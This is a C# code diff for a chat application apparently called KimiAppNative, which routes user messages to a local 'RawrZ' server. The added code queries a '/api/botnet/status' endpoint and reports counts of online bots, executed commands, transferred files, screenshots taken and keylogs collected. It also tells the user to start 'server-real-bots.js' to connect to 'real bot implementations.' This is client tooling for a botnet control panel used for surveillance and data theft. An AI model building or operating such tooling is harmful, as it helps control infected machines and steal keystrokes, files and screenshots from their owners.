@@ -320,24 +320,61 @@ namespace KimiAppNative
             UpdateMessageUI(aiMessage);
         }
 
-        private async Task GetLocalhostResponse(string userMessage, ChatMessage aiMessage)
+    private async Task GetLocalhostResponse(string userMessage, ChatMessage aiMessage)
+    {
+        try
         {
-            try
+            // First try to connect to localhost panel
+            var healthResponse = await _httpClient.GetAsync("http://localhost:8080/health");
+            if (!healthResponse.IsSuccessStatusCode)
             {
-                // First try to connect to localhost panel
-                var healthResponse = await _httpClient.GetAsync("http://localhost:8080/health");
-                if (!healthResponse.IsSuccessStatusCode)
-                {
-                    aiMessage.Content = "❌ Localhost panel is not running. Please start the RawrZ server on port 8080.";
-                    aiMessage.IsStreaming = false;
-                    UpdateMessageUI(aiMessage);
-                    return;
-                }
+                aiMessage.Content = "❌ Localhost panel is not running. Please start the RawrZ server on port 8080.\n\nTo start the real bot server, run: node server-real-bots.js";
+                aiMessage.IsStreaming = false;
+                UpdateMessageUI(aiMessage);
+                return;
+            }
 
-                // Try to use the CLI endpoint for AI-like responses
+            // Check if this is a bot-related query
+            if (userMessage.ToLower().Contains("bot") || userMessage.ToLower().Contains("status") || userMessage.ToLower().Contains("panel"))
+            {
+                // Get real bot status
+                var statusResponse = await _httpClient.GetAsync("http://localhost:8080/api/botnet/status");
+                if (statusResponse.IsSuccessStatusCode)
+                {
+                    var statusContent = await statusResponse.Content.ReadAsStringAsync();
+                    var statusResult = JsonConvert.DeserializeObject<dynamic>(statusContent);
+                    
+                    if (statusResult?.status == 200)
+                    {
+                        var data = statusResult.data;
+                        aiMessage.Content = $"🤖 **Real Bot Status**\n\n" +
+                                          $"📊 **Active Bots**: {data?.onlineBots}\n" +
+                                          $"📈 **Total Bots**: {data?.totalBots}\n" +
+                                          $"📝 **Total Logs**: {data?.totalLogs}\n" +
+                                          $"⚡ **Active Tasks**: {data?.activeTasks}\n\n" +
+                                          $"🔧 **Real-time Stats**:\n" +
+                                          $"• Commands Executed: {data?.realTimeStats?.commandsExecuted}\n" +
+                                          $"• Files Transferred: {data?.realTimeStats?.filesTransferred}\n" +
+                                          $"• Screenshots Taken: {data?.realTimeStats?.screenshotsTaken}\n" +
+                                          $"• Keylogs Collected: {data?.realTimeStats?.keylogsCollected}\n\n" +
+                                          $"✅ Connected to real bot implementations!";
+                    }
+                    else
+                    {
+                        aiMessage.Content = "❌ Failed to get bot status from real server.";
+                    }
+                }
+                else
+                {
+                    aiMessage.Content = "❌ Real bot server not responding. Make sure server-real-bots.js is running.";
+                }
+            }
+            else
+            {
+                // Try to use the CLI endpoint for general commands
                 var requestBody = new
                 {
-                    command = "ai",
+                    command = "help",
                     args = new[] { userMessage }
                 };
 
@@ -353,7 +390,8 @@ namespace KimiAppNative
                     
                     if (result?.success == true)
                     {
-                        aiMessage.Content = result.result?.ToString() ?? "Response received but no content.";
+                        aiMessage.Content = $"🔧 **RawrZ CLI Response**\n\n{result.result?.ToString() ?? "Command executed successfully."}\n\n" +
+                                          $"💡 **Tip**: Ask about 'bot status' to see real bot network information!";
                     }
                     else
                     {
@@ -365,14 +403,19 @@ namespace KimiAppNative
                     aiMessage.Content = $"❌ Localhost panel error: {response.StatusCode}";
                 }
             }
-            catch (Exception ex)
-            {
-                aiMessage.Content = $"❌ Failed to connect to localhost panel: {ex.Message}\n\nMake sure the RawrZ server is running on http://localhost:8080";
-            }
-
-            aiMessage.IsStreaming = false;
-            UpdateMessageUI(aiMessage);
         }
+        catch (Exception ex)
+        {
+            aiMessage.Content = $"❌ Failed to connect to localhost panel: {ex.Message}\n\n" +
+                              $"**To start the real bot server:**\n" +
+                              $"1. Run: `node server-real-bots.js`\n" +
+                              $"2. This connects to actual bot implementations\n" +
+                              $"3. Access panel at: http://localhost:8080/panel";
+        }
+
+        aiMessage.IsStreaming = false;
+        UpdateMessageUI(aiMessage);
+    }
 
         private string GetModelName(string modelKey)
         {
